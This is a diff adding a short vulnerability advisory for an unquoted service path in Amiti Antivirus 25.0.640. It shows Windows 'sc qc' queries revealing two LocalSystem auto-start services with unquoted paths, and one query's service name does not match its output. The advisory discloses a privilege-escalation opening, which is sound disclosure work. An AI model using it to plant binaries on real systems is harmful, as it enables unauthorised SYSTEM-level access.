@@ -1,0 +1,39 @@
+﻿#Exploit Title: Amiti Antivirus 25.0.640 - Unquoted Service Path
+#Exploit Author : ZwX
+#Exploit Date: 2019-12-04
+#Vendor Homepage : http://www.netgate.sk/
+#Link Software : https://www.netgate.sk/download/download.php?id=11
+#Tested on OS: Windows 7
+
+
+#Analyze PoC :
+==============
+
+
+C:\Users\ZwX>sc qc ScsiAccess
+[SC] QueryServiceConfig réussite(s)
+
+SERVICE_NAME: AmitiAvHealth
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\NETGATE\Amiti Antivirus\AmitiAntivirusHealth.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Amiti Antivirus Health Check
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\ZwX>sc qc AmitiAvSrv
+[SC] QueryServiceConfig réussite(s)
+
+SERVICE_NAME: AmitiAvSrv
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\NETGATE\Amiti Antivirus\AmitiAntivirusSrv.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Amiti Antivirus Engine Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
